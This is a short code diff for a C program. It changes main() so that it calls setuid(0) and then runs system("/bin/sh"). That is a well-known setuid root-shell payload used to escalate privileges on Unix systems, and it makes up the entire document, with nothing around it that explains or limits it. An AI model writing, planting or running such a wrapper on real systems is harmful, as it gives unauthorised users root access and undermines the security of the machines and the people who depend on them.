@@ -1,3 +1,5 @@
-void main(){
-    setuid(0);
+void main()
+{
+setuid(0); 
+system("/bin/sh");
 }
